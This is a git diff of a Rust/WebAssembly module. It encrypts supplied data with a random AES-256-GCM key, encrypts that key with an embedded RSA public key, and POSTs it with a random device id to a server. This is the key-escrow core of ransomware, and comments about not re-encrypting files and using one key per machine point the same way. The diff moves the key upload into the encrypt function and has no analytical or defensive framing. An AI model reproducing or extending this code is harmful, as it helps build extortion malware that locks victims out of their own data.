@@ -1,5 +1,7 @@
 mod utils;
 
+use std::panic;
+
 use aes_gcm::{
     aead::{Aead, KeyInit, OsRng},
     AeadCore, Aes256Gcm, Key,
@@ -9,8 +11,8 @@ use once_cell::sync::Lazy;
 use rand::distributions::{Alphanumeric, DistString};
 use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};
 use wasm_bindgen::prelude::*;
-use wasm_bindgen_futures::JsFuture;
-use web_sys::{console, RequestInit, Response};
+use wasm_bindgen_futures::{spawn_local, JsFuture};
+use web_sys::RequestInit;
 
 static SERVER_URL: &str = "http://localhost:3000";
 
@@ -18,9 +20,13 @@ static PUBLIC_KEY: &str = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAodnCUqJjb
 
 static AES_KEY: Lazy<Key<Aes256Gcm>> = Lazy::new(|| Aes256Gcm::generate_key(OsRng));
 
-// TODO: dont encrypt file already encrypted
+// TODO: clean memory
 #[wasm_bindgen]
 pub fn encrypt(plaintext: Vec<u8>) -> Vec<u8> {
+    if plaintext.is_empty() {
+        return Vec::new();
+    }
+
     let cipher = Aes256Gcm::new(&AES_KEY);
     let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
 
@@ -28,23 +34,37 @@ pub fn encrypt(plaintext: Vec<u8>) -> Vec<u8> {
     let mut encrypted = nonce.to_vec();
     encrypted.extend_from_slice(&ciphertext);
 
+    spawn_local(send_device_key());
+
     encrypted
 }
 
-async fn send_machine_key(machine_id: String) {
+// TODO: using ECC
+async fn send_device_key() {
+    let local_storage = web_sys::window().unwrap().local_storage().unwrap().unwrap();
+
+    if let Some(id) = local_storage.get_item("id").unwrap() {
+        if !id.is_empty() {
+            return;
+        }
+    };
+
+    let id = Alphanumeric.sample_string(&mut rand::thread_rng(), 16);
+    local_storage.set_item("id", &id).unwrap();
+
     let rsa_public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_KEY).unwrap();
 
     let encrypted_key = rsa_public_key
         .encrypt(&mut OsRng, Pkcs1v15Encrypt, AES_KEY.as_ref())
         .unwrap();
 
-    let base64_encoded_body = STANDARD.encode([machine_id.into_bytes(), encrypted_key].concat());
+    let base64_encoded_body = STANDARD.encode([id.into_bytes(), encrypted_key].concat());
 
     let mut opts = RequestInit::new();
     opts.method("POST");
     opts.body(Some(&JsValue::from_str(&base64_encoded_body)));
 
-    let resp_value = JsFuture::from(
+    JsFuture::from(
         web_sys::window()
             .unwrap()
             .fetch_with_str_and_init(SERVER_URL, &opts),
@@ -52,19 +72,13 @@ async fn send_machine_key(machine_id: String) {
     .await
     .unwrap();
 
-    let resp: Response = resp_value.dyn_into().unwrap();
-    let json = JsFuture::from(resp.json().unwrap()).await.unwrap();
-
-    console::log_1(&json);
+    // let resp: Response = resp_value.dyn_into().unwrap();
+    // let json = JsFuture::from(resp.json().unwrap()).await.unwrap();
+    //
+    // console::log_1(&json);
 }
 
 #[wasm_bindgen(start)]
-async fn start() {
-    let local_storage = web_sys::window().unwrap().local_storage().unwrap().unwrap();
-    let machine_id = Alphanumeric.sample_string(&mut rand::thread_rng(), 16);
-
-    local_storage.set_item("machine_id", &machine_id).unwrap();
-
-    // TODO: using one key per machine
-    send_machine_key(machine_id).await;
+fn start() {
+    panic::set_hook(Box::new(console_error_panic_hook::hook));
 }
